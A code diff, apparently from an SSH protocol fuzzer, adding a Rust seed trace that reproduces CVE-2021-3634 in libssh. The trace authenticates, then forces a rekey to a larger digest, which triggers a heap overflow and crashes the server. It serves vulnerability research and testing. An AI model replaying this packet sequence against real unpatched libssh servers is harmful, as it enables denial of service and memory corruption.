@@ -2457,6 +2457,128 @@ fn seed_client_attacker_rekey_impl(
     }
 }
 
+/// CVE-2021-3634 witness: a client-initiated rekey that negotiates a KEX whose digest is
+/// LARGER than the first exchange's. The first handshake is curve25519-sha256 (32-byte
+/// exchange hash H, so libssh sizes `session_id` to 32 bytes). The rekey KEXINIT offers
+/// only `diffie-hellman-group16-sha512` (64-byte digest) and the rekey KEXDH_INIT carries
+/// an in-range `e` (`fn_dh_exponent_huge` ≈ 2^2048 < group16's 4096-bit prime), so the
+/// server accepts the re-exchange and sets `digest_len = 64` on the new crypto. In libssh
+/// <= 0.9.5 `session_id` and the secret hash share a single `digest_len`, so when the
+/// rekey's NEWKEYS switch runs `ssh_packet_set_newkeys`, the carried-over 32-byte
+/// `session_id` is re-malloc'd / memcpy'd (and later `explicit_bzero`'d in `crypto_free`)
+/// with the new 64-byte length — a heap buffer over-read/over-write (CWE-787). The fix
+/// (0.9.6, commit d3060bc8) gives `session_id` its own `session_id_len`.
+///
+/// Every rekey packet is encrypted under the FIRST keys (the attacker's derived c2s
+/// AES-256-GCM key/iv), so the attacker never needs the group16 shared secret: the server
+/// crashes in `set_newkeys` upon the rekey NEWKEYS, before any post-rekey key is used.
+/// Publickey auth (key A) precedes the rekey because libssh only admits a rekey KEXINIT
+/// once the connection is established. Unlike `seed_client_attacker_rekey`, this trace does
+/// NOT set `first_kex_packet_follows` — the bug is the digest-size change alone.
+pub fn seed_client_attacker_rekey_dh_group16(server: AgentName) -> Trace<SshProtocolTypes> {
+    let server_banner_id =
+        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
+    let server_kexinit = term! { (server, 0)[None]/SshMessage };
+    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
+    let server_ecdh_reply_raw =
+        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
+    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
+    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
+    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
+
+    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
+    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
+    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
+    let exch_hash = term! {
+        fn_kex_exchange_hash(
+            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
+            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
+        )
+    };
+    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
+    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
+
+    // Authenticate first (publickey, key A; counters 0,1) so the rekey KEXINIT is admitted.
+    let svc_req = term! {
+        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
+    };
+    let sig = term! {
+        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
+    };
+    let auth_req = term! {
+        fn_encrypt_packet_aesgcm(
+            (fn_user_auth_request(
+                (fn_username), (fn_ssh_connection), (fn_method_publickey),
+                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
+            )),
+            (@key), (@iv), (fn_u32_auto))
+    };
+
+    // Rekey handshake, encrypted under the FIRST keys. The rekey KEXINIT offers only
+    // group16-sha512 so the server MUST re-exchange with a 64-byte digest (vs the first
+    // 32-byte curve25519 one). The KEXDH_INIT carries an in-range `e`, so the server
+    // completes the re-KEX and reaches the vulnerable session_id/digest_len mismatch.
+    let rekey_kexinit_msg = term! {
+        fn_kex_init(
+            (fn_cookie_zeros),
+            (fn_kex_algos((fn_namelist_1((fn_algo_dh_group16_sha512))))),
+            (fn_sig_schemes((fn_namelist_append((fn_namelist_1((fn_algo_rsa_sha2_512))), (fn_algo_rsa_sha2_256))))),
+            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
+            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
+            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
+            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
+            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
+            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
+        )
+    };
+    let rekey_kexinit = term! {
+        fn_encrypt_packet_aesgcm((@rekey_kexinit_msg), (@key), (@iv), (fn_u32_auto))
+    };
+    // Classic modular-DH KEXDH_INIT with an in-range exponent (group16's prime is 4096-bit,
+    // so fn_dh_exponent_huge ≈ 2^2048 is well within [1, p-1]).
+    let rekey_dh_init = term! {
+        fn_encrypt_packet_aesgcm(
+            (fn_kex_dh_init((fn_dh_exponent_huge))), (@key), (@iv), (fn_u32_auto))
+    };
+    let rekey_newkeys = term! {
+        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_auto))
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            server,
+            SshDescriptorConfig {
+                typ: AgentType::Server,
+                try_reuse: false,
+                ..Default::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(server),
+            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
+            OutputAction::new_step(server), // KEXINIT
+            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
+            InputAction::new_step(
+                server,
+                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
+            ),
+            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
+            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
+            InputAction::new_step(server, term! { @svc_req }),
+            OutputAction::new_step(server), // SERVICE_ACCEPT
+            InputAction::new_step(server, term! { @auth_req }),
+            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
+            InputAction::new_step(server, term! { @rekey_kexinit }),
+            OutputAction::new_step(server), // KEXINIT
+            InputAction::new_step(server, term! { @rekey_dh_init }),
+            OutputAction::new_step(server), // KEX_ECDH_REPLY (group16), NEWKEYS
+            InputAction::new_step(server, term! { @rekey_newkeys }),
+        ],
+        ..Default::default()
+    }
+}
+
 /// Publickey "query, then sign" (RFC 4252 §7), the flow real clients use: first a
 /// USERAUTH_REQUEST WITHOUT signature asking whether key A is acceptable; the
 /// server answers USERAUTH_PK_OK echoing the algorithm and key blob; the client
